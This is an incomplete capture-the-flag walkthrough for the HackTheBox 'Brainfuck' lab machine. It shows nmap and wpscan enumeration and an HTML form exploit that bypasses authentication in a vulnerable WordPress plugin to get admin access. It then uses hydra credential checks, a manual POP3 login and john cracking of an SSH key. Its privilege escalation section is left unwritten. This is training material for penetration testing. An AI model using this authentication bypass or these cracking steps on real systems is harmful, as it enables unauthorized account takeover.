## Initial Exploit - 
***
Nmap finds the **www.brainfuck.htb** and **sup3rs3cr3t.brainfuck.htb** domains:  
> nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN "/home/kali/hackthebox/brainfuck/results/10.129.1.1/scans/_full_tcp_nmap.txt" -oX "/home/kali/hackthebox/brainfuck/results/10.129.1.1/scans/xml/_full_tcp_nmap.xml" 10.129.1.1

![](/home/kali/Walkthroughs/HackTheBox/brianfuck/images/nmap.png)

Add them to the hosts file:  
> sudo vi /etc/hosts

![](/home/kali/Walkthroughs/HackTheBox/brianfuck/images/hosts.png) 

This page is running WordPress. Scan it with wpscan:  
> wpscan --url https://brainfuck.htb:443/ --enumerate ap,at,cb,dbe --plugins-detection aggressive --disable-tls-ch
ecks | tee wpscan443.txt

It finds the wp-support-plus-responsive-ticket-system plugin v7.1.3 running:  
![](/home/kali/Walkthroughs/HackTheBox/brianfuck/images/wpscan.png)

WPScan's website has an exploit description [here](https://wpscan.com/vulnerability/b1808005-0809-4ac7-92c7-1f65e410ac4f). Copy the HTML code into a file:  
```
<form method="post" action="https://brainfuck.com/wp-admin/admin-ajax.php">

	Username: <input type="text" name="username" value="administrator">

	<input type="hidden" name="email" value="sth">

	<input type="hidden" name="action" value="loginGuestFacebook">

	<input type="submit" value="Login">

</form> 
```

Open the file with Firefox:  
> firefox ticket.html

![](/home/kali/Walkthroughs/HackTheBox/brianfuck/images/exp.png)

Click the Login button. Revisit the page at **https://brainfuck.htb/** to confirm you're logged in as admin:  
![](/home/kali/Walkthroughs/HackTheBox/brianfuck/images/loggedin.png)


Navigate to **https://brainfuck.htb/wp-admin/options-general.php?page=swpsmtp_settings** and view the page source to reveal the password:  
![](/home/kali/Walkthroughs/HackTheBox/brianfuck/images/smtp_pass.png)

Hydra finds the credentials are valid for pop3 and imap:  

> hydra -L users.txt -p kHGuERB29DNiNE 10.129.1.1 imap
> 
> hydra -L users.txt -p kHGuERB29DNiNE 10.129.1.1 pop3

![](/home/kali/Walkthroughs/HackTheBox/brianfuck/images/users.png)

![](/home/kali/Walkthroughs/HackTheBox/brianfuck/images/hydra.png)

Log into POP3 with the credentials **orestis@brainfuck.htb:kHGuERB29DNiNE**:  
> nc 10.129.1.1 110

> user orestis

> pass kHGuERB29DNiNE

Read the email containing another set of credentials:  
> retr 2

![](/home/kali/Walkthroughs/HackTheBox/brianfuck/images/pop3.png)

Log in at **https://sup3rs3cr3t.brainfuck.htb** using the credentials **orestis:kIEnnfEKJ#9UmdO**. Navigate to **https://sup3rs3cr3t.brainfuck.htb/d/3-key** to view an encrypted chat. Use Cyber Chef to find the key used to encrypt the chat:  
![](/home/kali/Walkthroughs/HackTheBox/brianfuck/images/cyberchef.png)


The output is **fuckmybrain** repeated. Decode the URL using that key:  
![](/home/kali/Walkthroughs/HackTheBox/brianfuck/images/cyberchef2.png)

Navigate to **https://10.129.84.35/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa** and download the SSH key. The SSH key is encrypted. Crack it with john:  
> ssh2john id_rsa > id_rsa.hash

> john --wordlist=/usr/share/wordlist/rockyou.txt id_rsa.hash

![](/home/kali/Walkthroughs/HackTheBox/brianfuck/images/john.png)

Log into SSH using the private key and the passphrase **3poulakia!**:  
> ssh orestis@10.129.84.35 -i id_rsa

<div style="page-break-after: always;"></div>

## Privilege Escalation - 
***
Annoying CTF box  do it later








<div style="page-break-after: always;"></div>

## Proof - 
***
### User:

![](/home/kali/Walkthroughs/HackTheBox/brianfuck/images/user.png)

### Root:

root